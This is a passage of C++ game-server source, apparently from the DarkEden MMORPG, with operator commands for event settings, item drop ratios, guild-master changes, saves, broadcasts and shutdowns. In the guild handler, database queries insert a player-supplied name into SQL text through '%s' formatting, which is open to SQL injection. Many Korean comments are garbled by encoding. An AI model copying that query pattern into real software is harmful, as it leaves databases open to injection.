                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (set_value == "off") {
      g_pVariableManager->setSummonMotorcycle(false);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_SUMMON_MOTORCYCLE), "OFF");
      //			message << "���  기�� OFF
      //��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    }
  } else if (set_type == "enemy_limit_time") {
    int enemy_limit_time = atoi(set_value.c_str());
    if (enemy_limit_time <= 180 || enemy_limit_time >= 3600)
      return;

    g_pVariableManager->setEnemyLimitTime(enemy_limit_time);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_MONSTER_FORGET_TIME),
            set_value.c_str());
    //	    message << "몬���� ��  ���" << set_value << "��
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "rare_item_ratio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100000)
      return;

    g_pVariableManager->setRareItemRatio(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_RARE_ITEM_RATIO),
            set_value.c_str());
    //		message << " �� 루� � " << set_value << "%�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "unique_item_ratio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 10000)
      return;

    g_pVariableManager->setUniqueItemRatio(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_UNIQUE_ITEM_RATIO),
            set_value.c_str());
    //		message << " �� 루� � " << set_value << "/10000
    //�� ��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "active_master_lair") {
    MasterLairManager *pMasterLairManager = NULL;

    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      pMasterLairManager = pZone->getMasterLairManager();
    }

    if (set_value == "on") {
      g_pVariableManager->setActiveMasterLair(true);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_LAIR_ACTIVATE), "ON");
      //			message << "매�  �벤�� ON
      //��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());

      if (pMasterLairManager != NULL) {
        pMasterLairManager->startEvent();
      }
    } else if (set_value == "off") {
      g_pVariableManager->setActiveMasterLair(false);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_LAIR_ACTIVATE), "OFF");
      //			message << "매�  �벤�� OFF
      //��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());

      if (pMasterLairManager != NULL) {
        pMasterLairManager->stopEvent();
      }
    }
  } else if (set_type == "retry_master_lair") {
    if (set_value == "on") {
      g_pVariableManager->setRetryMasterLair(true);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_RETRY_MASTER_LAIR), "ON");
      //			message << "매� �� 죽� �� ���기�
      //ON ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (set_value == "off") {
      g_pVariableManager->setRetryMasterLair(false);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_RETRY_MASTER_LAIR), "OFF");
      //			message << "매� �� 죽� �� ���기�
      //OFF ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    }
  }

  else if (set_type == "harvest_festival_item_ratio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 10000)
      return;

    g_pVariableManager->setHarvestFestivalItemRatio(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_HARVEST_FESTIVAL_ITEM_RATIO),
            set_value.c_str());
    //		message << "� �� �� 루� � 1/" << ratio << "
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "master_blood_drain_start_hp") {
    int percent = atoi(set_value.c_str());
    if (percent < 0 || percent > 100)
      return;

    g_pVariableManager->setMasterBloodDrainStartHP(percent);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_BLOOD_DRAIN_START_HP),
            set_value.c_str());
    //		message << "매��� ��  HP� " << percent << "%�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "master_blood_drain_start_bd") {
    int percent = atoi(set_value.c_str());
    if (percent < 0 || percent > 100)
      return;

    g_pVariableManager->setMasterBloodDrainStartBD(percent);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_BLOOD_DRAIN_START_BD),
            set_value.c_str());
    //		message << "매��� ��   �� � " << percent <<
    //"%� ��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "master_blood_drain_end_hp") {
    int percent = atoi(set_value.c_str());
    if (percent < 0 || percent > 100)
      return;

    g_pVariableManager->setMasterBloodDrainEndHP(percent);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_BLOOD_DRAIN_END_HP),
            set_value.c_str());
    //		message << "매��� �� (?) HP� " << percent << "%�
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "master_blood_drain_end_bd") {
    int percent = atoi(set_value.c_str());
    if (percent < 0 || percent > 100)
      return;

    g_pVariableManager->setMasterBloodDrainEndBD(percent);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_MASTER_BLOOD_DRAIN_END_BD),
            set_value.c_str());
    //		message << "매��� �� (?)  �� � " << percent
    //<< "%� ��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "chief_monster") {
    if (set_value == "on") {
      g_pVariableManager->setActiveChiefMonster(true);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_CHIEF_MONSTER), "ON");
      //			message << "� 몬�� 기�� ON ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (set_value == "off") {
      g_pVariableManager->setActiveChiefMonster(false);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_CHIEF_MONSTER), "OFF");
      //			message << "� 몬�� 기�� OFF ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    }
  } else if (set_type == "chief_monster_rare_item_percent") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100)
      return;

    g_pVariableManager->setChiefMonsterRareItemPercent(ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_CHIEF_MONSTER_RARE_ITEM_RATIO),
            set_value.c_str());
    //		message << "� 몬��  �� 루� � " << set_value
    //<< "%� ��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "newbie_transport_to_guild") {
    if (set_value == "on") {
      g_pVariableManager->setNewbieTransportToGuild(true);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_NEWBIE_TRANSPORT_TO_GUILD),
              "ON");
      //			message << "��� 40��, 길�� ��기
      //기�� ON ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (set_value == "off") {
      g_pVariableManager->setNewbieTransportToGuild(false);
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_SET_NEWBIE_TRANSPORT_TO_GUILD),
              "OFF");
      //			message << "��� 40��, 길�� ��기
      //기�� OFF ��.";
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    }
  } else if (set_type == "xmas_2002") {
    size_t l = set_value.find_first_of(' ', 0);
    size_t m = set_value.find_first_of(' ', l + 1);

    string value_firecracker = set_value.substr(0, l);
    string value_treepart = set_value.substr(l + 1, m - l - 1);
    string value_giftbox = set_value.substr(m + 1);

    g_pVariableManager->setVariable(CHRISTMAS_FIRE_CRACKER_RATIO,
                                    value_firecracker);
    const string &msg1 =
        g_pVariableManager->toString(CHRISTMAS_FIRE_CRACKER_RATIO);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
    gcSystemMessage.setMessage(msg1);

    if (pGamePlayer != NULL)
      pGamePlayer->sendPacket(&gcSystemMessage);

    g_pVariableManager->setVariable(CHRISTMAS_TREE_PART_RATIO, value_treepart);
    const string &msg2 =
        g_pVariableManager->toString(CHRISTMAS_TREE_PART_RATIO);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
    gcSystemMessage.setMessage(msg2);

    if (pGamePlayer != NULL)
      pGamePlayer->sendPacket(&gcSystemMessage);

    g_pVariableManager->setVariable(CHRISTMAS_GIFT_BOX_RATIO, value_giftbox);
    const string &msg3 = g_pVariableManager->toString(CHRISTMAS_GIFT_BOX_RATIO);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());

    gcSystemMessage.setMessage(msg3);

  }
  // 2006 12 6 �리�� �벤 ��
  else if (set_type == "SnowmanPartRatio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100000)
      return;

    g_pVariableManager->setSnowmanPartRatio(ratio);
    g_pVariableManager->setVariable(EVENT_SNOW_MAN_PART_RATIO, ratio);
    // message << "Snowman Part Ratio 1/" << ratio ;
    const string &msg = g_pVariableManager->toString(EVENT_SNOW_MAN_PART_RATIO);
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  }
  // 2006 09 26
  else if (set_type == "RiceCakeRatio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100000)
      return;

    g_pVariableManager->setRiceCakeItemRatio(ratio);
    g_pVariableManager->setVariable(EVENT_RICE_CAKE_RATIO, ratio);
    char msg[100];
    sprintf(msg, g_pStringPool->c_str(STRID_SET_HARVEST_FESTIVAL_ITEM_RATIO),
            set_value.c_str());
    //		message << "� �� �� 루� � 1/" << ratio << "
    //��.";
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "RiceCakeEvent") {
    if (set_value == "on") {
      g_pVariableManager->setRiceCakeEvent(true);
      char msg[100];
      sprintf(msg, "RICE CAKE EVENT : %s", "ON");
      gcSystemMessage.setMessage(msg);
    } else if (set_value == "off") {
      g_pVariableManager->setRiceCakeEvent(false);
      char msg[100];
      sprintf(msg, "RICE CAKE EVENT : %s", "OFF");
      gcSystemMessage.setMessage(msg);
    }
  }
  // 20080425 �� ��� �벤
  else if (set_type == "ThreeLeafRatio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100000)
      return;

    g_pVariableManager->setVariable(THREE_LEAF_CLOVER_RATIO, ratio);
    char msg[100];
    sprintf(msg, "Three-leaf clover ratio 1/%s", set_value.c_str());
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "ThreeLeafEvent") {
    if (set_value == "on") {
      g_pVariableManager->setThreeLeafEvent(true);
      char msg[100];
      sprintf(msg, "THREE-LEAF CLOVER EVENT : %s", "ON");
      gcSystemMessage.setMessage(msg);
    } else if (set_value == "off") {
      g_pVariableManager->setThreeLeafEvent(false);
      char msg[100];
      sprintf(msg, "THREE-LEAF CLOVER EVENT : %s", "OFF");
      gcSystemMessage.setMessage(msg);
    }
  }
  // 20080425 �� ��� �벤
  else if (set_type == "FourLeafRatio") {
    int ratio = atoi(set_value.c_str());
    if (ratio < 0 || ratio > 100000)
      return;

    g_pVariableManager->setVariable(FOUR_LEAF_CLOVER_RATIO, ratio);
    char msg[100];
    sprintf(msg, "Four-leaf clover ratio 1/%s", set_value.c_str());
    gcSystemMessage.setMessage(msg);
    filelog("change.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            gcSystemMessage.toString().c_str());
  } else if (set_type == "FourLeafEvent") {
    if (set_value == "on") {
      g_pVariableManager->setFourLeafEvent(true);
      char msg[100];
      sprintf(msg, "FOUR-LEAF CLOVER EVENT : %s", "ON");
      gcSystemMessage.setMessage(msg);
    } else if (set_value == "off") {
      g_pVariableManager->setFourLeafEvent(false);
      char msg[100];
      sprintf(msg, "FOUR-LEAF CLOVER EVENT : %s", "OFF");
      gcSystemMessage.setMessage(msg);
    }
  }
  // 2006 12 8
  else if (set_type == "EventBox200612") {
    if (set_value == "on") {
      g_pVariableManager->setEventBox200612(true);
      char msg[100];
      sprintf(msg, "EVENT BOX 2006 12 : %s", "ON");
      gcSystemMessage.setMessage(msg);
    } else if (set_value == "off") {
      g_pVariableManager->setEventBox200612(false);
      char msg[100];
      sprintf(msg, "EVENT BOX 2006 12 : %s", "OFF");
      gcSystemMessage.setMessage(msg);
    }
  } else if (set_type == "ItemTaxRatio") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      if (set_value.size() != 0) {
        int Tax = atoi(set_value.c_str());
        g_pCastleInfoManager->setItemTaxRatio(pZone, Tax);
      } else {
        gcSystemMessage.setMessage(
            g_pStringPool->getString(STRID_WRONG_ITEM_TAX_RATIO));
      }
    }
  } else if (set_type == "MikllizzMaxPlayer") {
    if (pGamePlayer != NULL) {
      int ratio = atoi(set_value.c_str());
      g_pVariableManager->setMikllizzMaxPlayer(ratio);
      char msg[100];
      sprintf(msg, "Mikllizz Max Player : %d", ratio);
      gcSystemMessage.setMessage(msg);
    }
  } else if (set_type == "NewbieEvent") {
    if (set_value == "on") {
      g_pVariableManager->setNewbieItemEvent(true);
      char msg[100];
      sprintf(msg, "Newbie Item Event : %s", "ON");
      gcSystemMessage.setMessage(msg);
    } else if (set_value == "off") {
      g_pVariableManager->setNewbieItemEvent(false);
      char msg[100];
      sprintf(msg, "Newbie Item Event : %s", "OFF");
      gcSystemMessage.setMessage(msg);
    }
  }
  /*
  else if (set_type == "NewAccountEvent")
  {
          if (set_value=="on")
          {
                  g_pVariableManager->setNewAccountFirstGoal80Event(true);
                  char msg[100];
          sprintf( msg, "New Account Level 80 Goal Event : %s", "ON");
                  gcSystemMessage.setMessage(msg);
          }
          else if (set_value=="off")
          {
                  g_pVariableManager->setNewAccountFirstGoal80Event(false);
                  char msg[100];
          sprintf( msg, "New Account Level 80 Goal Event : %s", "OFF");
                  gcSystemMessage.setMessage(msg);
          }
  }
  */
  else {
    // by sigi. 2002.11.19
    VariableType vt = g_pVariableManager->getVariableType(set_type);

    if (vt != VARIABLE_MAX) {
      g_pVariableManager->setVariable(vt, set_value);
      const string &msg = g_pVariableManager->toString(vt);
      gcSystemMessage.setMessage(msg);
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());

      if (vt == PREMIUM_HALF_EVENT) {
        GCNoticeEvent gcNoticeEvent;

        if (g_pVariableManager->getVariable(vt)) {
          gcNoticeEvent.setCode(NOTICE_EVENT_PREMIUM_HALF_START);
        } else {
          gcNoticeEvent.setCode(NOTICE_EVENT_PREMIUM_HALF_END);
        }

        // �존�� �린�.
        getZoneByZoneID(61)->broadcastPacket(&gcNoticeEvent); // ��
        getZoneByZoneID(64)->broadcastPacket(&gcNoticeEvent); // 롨�
        getZoneByZoneID(1007)->broadcastPacket(
            &gcNoticeEvent); // �����(�리�)
      } else if (vt == TODAY_IS_HOLYDAY) {
        GCNoticeEvent gcNoticeEvent;
        gcNoticeEvent.setCode(NOTICE_EVENT_HOLYDAY);
        gcNoticeEvent.setParameter(g_pVariableManager->getVariable(vt));

        g_pZoneGroupManager->pushBroadcastPacket(&gcNoticeEvent);
      } else if (vt == CROWN_PRICE) {
        GCNoticeEvent gcNoticeEvent;
        gcNoticeEvent.setCode(NOTICE_EVENT_CROWN_PRICE);
        gcNoticeEvent.setParameter(g_pVariableManager->getVariable(vt));

        g_pZoneGroupManager->pushBroadcastPacket(&gcNoticeEvent);
      }
    } else {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_WRONG_VARIABLE_NAME));
    }
  }

  // �� �� �� 보�기 ()
  if (pGamePlayer != NULL) {
    pGamePlayer->sendPacket(&gcSystemMessage);
  }

  __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opzone(string msg, int i) throw(ProtocolException, Error) {
  __BEGIN_TRY

  //////////////
  // Zone Info
  //////////////
  /*	ZoneInfo* pZoneInfo = new ZoneInfo();
          pZoneInfo->setZoneID( 10001 );
          pZoneInfo->setZoneGroupID( 6 );
          pZoneInfo->setZoneType( "NORMAL_FIELD" );
          pZoneInfo->setZoneLevel( 0 );
          pZoneInfo->setZoneAccessMode( "PUBLIC" );
          pZoneInfo->setZoneOwnerID( "" );
          pZoneInfo->setPayPlay( "" );

          pZoneInfo->setSMPFilename( "team_hdqrs.smp" );
          pZoneInfo->setSSIFilename( "team_hdqrs.ssi" );
          pZoneInfo->setFullName( "team" );
          pZoneInfo->setShortName( "team" );

          g_pZoneInfoManager->addZoneInfo( pZoneInfo );

          /////////
          // Zone
          /////////
          Zone* pZone = new Zone( 10001 );
          Assert( pZone != NULL );

          ZoneGroup* pZoneGroup = g_pZoneGroupManager->getZoneGroup(6);
          Assert( pZoneGroup != NULL );

          pZone->setZoneGroup( pZoneGroup );
          pZoneGroup->addZone( pZone );
          pZone->init();
  */
  __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opguild(string msg, int i,
                           Creature *pCreature) throw(ProtocolException,
                                                      Error) {
  __BEGIN_TRY

  i = i + 7;

  size_t j = msg.find_first_of(' ', i);
  string command = msg.substr(i, j - i);
  string variable = trim(msg.substr(j + 1));

  GamePlayer *pGamePlayer = dynamic_cast<GamePlayer *>(pCreature->getPlayer());

  if (command == "changeGuildMaster") {
    int a = variable.find_first_of(' ', 0);
    GuildID_t guildID = atoi(variable.substr(0, a).c_str());
    string master = trim(variable.substr(a + 1));

    Guild *pGuild = g_pGuildManager->getGuild(guildID);
    if (pGuild == NULL) {
      GCSystemMessage msg;
      msg.setMessage("No such Guild");
      pGamePlayer->sendPacket(&msg);

      return;
    }

    GuildMember *pGuildMember = pGuild->getMember(master);
    if (pGuildMember == NULL) {
      GCSystemMessage msg;
      msg.setMessage("No such Guild Member");
      pGamePlayer->sendPacket(&msg);

      return;
    }

    if (pGuildMember->getRank() != GuildMember::GUILDMEMBER_RANK_NORMAL &&
        pGuildMember->getRank() != GuildMember::GUILDMEMBER_RANK_SUBMASTER) {
      GCSystemMessage msg;
      msg.setMessage("New Guild Member must be submaster or normal member");
      pGamePlayer->sendPacket(&msg);

      return;
    }

    Statement *pStmt = NULL;
    Result *pResult = NULL;

    BEGIN_DB {
      pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

      if (pGuild->getRace() == Guild::GUILD_RACE_SLAYER) {
        pResult = pStmt->executeQuery(
            "SELECT Fame, BladeLevel, SwordLevel, GunLevel, HealLevel, "
            "EnchantLevel FROM Slayer WHERE Name = '%s'",
            master.c_str());
        int i = 0;

        if (!pResult->next()) {
          SAFE_DELETE(pStmt);
          return;
        }

        Fame_t Fame = pResult->getInt(++i);
        SkillLevel_t BladeLevel = pResult->getInt(++i);
        SkillLevel_t SwordLevel = pResult->getInt(++i);
        SkillLevel_t GunLevel = pResult->getInt(++i);
        SkillLevel_t HealLevel = pResult->getInt(++i);
        SkillLevel_t EnchantLevel = pResult->getInt(++i);

        SkillDomainType_t highestDomain;
        SkillLevel_t maxLevel;

        if (BladeLevel > SwordLevel) {
          maxLevel = BladeLevel;
          highestDomain = SKILL_DOMAIN_BLADE;
        } else {
          maxLevel = SwordLevel;
          highestDomain = SKILL_DOMAIN_SWORD;
        }
        if (GunLevel > maxLevel) {
          maxLevel = GunLevel;
          highestDomain = SKILL_DOMAIN_GUN;
        }
        if (HealLevel > maxLevel) {
          maxLevel = HealLevel;
          highestDomain = SKILL_DOMAIN_HEAL;
        }
        if (EnchantLevel > maxLevel) {
          maxLevel = EnchantLevel;
          highestDomain = SKILL_DOMAIN_ENCHANT;
        }

        if (maxLevel < REQUIRE_SLAYER_MASTER_SKILL_DOMAIN_LEVEL) {
          SAFE_DELETE(pStmt);

          GCSystemMessage msg;
          msg.setMessage("Master Level Limit Error");
          pGamePlayer->sendPacket(&msg);

          return;
        }

        if (Fame < REQUIRE_SLAYER_MASTER_FAME[highestDomain]) {
          SAFE_DELETE(pStmt);

          GCSystemMessage msg;
          msg.setMessage("Master Fame Limit Error");
          pGamePlayer->sendPacket(&msg);

          return;
        }
      } else if (pGuild->getRace() == Guild::GUILD_RACE_VAMPIRE) {
        pResult = pStmt->executeQuery(
            "SELECT Level FROM Vampire WHERE Name = '%s'", master.c_str());

        if (!pResult->next()) {
          SAFE_DELETE(pStmt);
          return;
        }

        Level_t Level = pResult->getInt(1);
        if (Level < REQUIRE_VAMPIRE_MASTER_LEVEL) {
          SAFE_DELETE(pStmt);

          GCSystemMessage msg;
          msg.setMessage("Master Level Limit Error");
          pGamePlayer->sendPacket(&msg);

          return;
        }
      } else if (pGuild->getRace() == Guild::GUILD_RACE_OUSTERS) {
        pResult = pStmt->executeQuery(
            "SELECT Level FROM Ousters WHERE Name = '%s'", master.c_str());

        if (!pResult->next()) {
          SAFE_DELETE(pStmt);
          return;
        }

        Level_t Level = pResult->getInt(1);
        if (Level < REQUIRE_OUSTERS_MASTER_LEVEL) {
          SAFE_DELETE(pStmt);

          GCSystemMessage msg;
          msg.setMessage("Master Level Limit Error");
          pGamePlayer->sendPacket(&msg);

          return;
        }
      } else {
        SAFE_DELETE(pStmt);
        return;
      }

      SAFE_DELETE(pStmt);
    }
    END_DB(pStmt)

    GSModifyGuildMember gsPacket;
    gsPacket.setGuildID(pGuild->getID());
    gsPacket.setName(master);
    gsPacket.setGuildMemberRank(GuildMember::GUILDMEMBER_RANK_MASTER);
    gsPacket.setSender(pCreature->getName());

    g_pSharedServerManager->sendPacket(&gsPacket);
  }

  __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opsave(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      GCSystemMessage gcSystemMessage;

  gcSystemMessage.setMessage(g_pStringPool->getString(STRID_SAVE_YOUR_DATA));

  Statement *pStmt =
      g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

  Result *pResult =
      pStmt->executeQuery("SELECT MAX(ZoneGroupID) FROM ZoneGroupInfo");

  pResult->next();

  BYTE GroupCount = pResult->getInt(1) + 1;

  for (int i = 1; i < GroupCount; i++) {
    ZoneGroup *pZoneGroup = NULL;

    try {
      pZoneGroup = g_pZoneGroupManager->getZoneGroup(i);
    } catch (NoSuchElementException &) {
      SAFE_DELETE(pStmt);
      throw Error("Critical Error: The zone group does not exist in ZoneInfoManager.");
    }

    ZonePlayerManager *pZonePlayerManager = pZoneGroup->getZonePlayerManager();

    pZonePlayerManager->broadcastPacket(&gcSystemMessage);
    pZonePlayerManager->save();
  }

  SAFE_DELETE(pStmt);

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opwall(GamePlayer *pGamePlayer, string msg,
                          int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      size_t j = msg.find_first_of(' ', i + 1);

  GCSystemMessage gcSystemMessage;

  gcSystemMessage.setType(SYSTEM_MESSAGE_OPERATOR);
  gcSystemMessage.setMessage(msg.substr(j + 1, msg.size() - j - 1).c_str());

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "[Wall]%s, %s", pCreature->getName().c_str(),
            gcSystemMessage.getMessage().c_str());
  }

  g_pZoneGroupManager->pushBroadcastPacket(&gcSystemMessage);

  /*
  Statement* pStmt =
  g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

  Result* pResult = pStmt->executeQuery("SELECT MAX(ZoneGroupID) FROM
  ZoneGroupInfo");

  pResult->next();

  BYTE GroupCount = pResult->getInt(1) + 1;

  for (int i = 1; i < GroupCount; i++) {

          ZoneGroup* pZoneGroup;

          try
          {
                  pZoneGroup = g_pZoneGroupManager->getZoneGroup(i);
          }
          catch (NoSuchElementException&)
          {
                  SAFE_DELETE(pStmt);
                  throw Error("Critical Error : ZoneInfoManager �� 존그룹�
  존��� ��.");
          }

          ZonePlayerManager* pZonePlayerManager =
  pZoneGroup->getZonePlayerManager();

          pZonePlayerManager->broadcastPacket_NOBLOCKED(&gcSystemMessage);

  }

  SAFE_DELETE(pStmt);
  */

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opshutdown(GamePlayer *pGamePlayer, string msg,
                              int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      // � zone 붴면 ..
      // multithread�.. lock 걸� effect� 붬� .
      size_t j = msg.find_first_of(' ', i + 1);
  Turn_t dTime = atoi(msg.substr(j + 1, msg.size() - j - 1).c_str());

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "[ShutDown]%s, %d", pCreature->getName().c_str(),
            (int)dTime);
  }

  EffectShutDown *pEffectShutDown = new EffectShutDown();
  pEffectShutDown->setNextTime(100);
  pEffectShutDown->setDelay(100);
  pEffectShutDown->setDeadline(dTime);

  if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();

    Zone *pZone = pCreature->getZone();
    (pZone->getObjectRegistry()).registerObject(pEffectShutDown);

    pZone->addEffect(pEffectShutDown);
  } else {
    int ZoneNum = 1003;

    ZoneInfo *pZoneInfo = NULL;
    try {
      pZoneInfo = g_pZoneInfoManager->getZoneInfo(ZoneNum);
    } catch (NoSuchElementException &) {
      throw Error("Attempting to shut down, but there is no zone ID.");
    }

    ZoneGroup *pZoneGroup = NULL;

    try {
      pZoneGroup =
          g_pZoneGroupManager->getZoneGroup(pZoneInfo->getZoneGroupID());
    } catch (NoSuchElementException &) {
      throw Error("Attempting to shut down, but there is nothing in the zoneGroup.");
    }

    Zone *pZone = pZoneGroup->getZone(ZoneNum);

    (pZone->getObjectRegistry()).registerObject(pEffectShutDown);

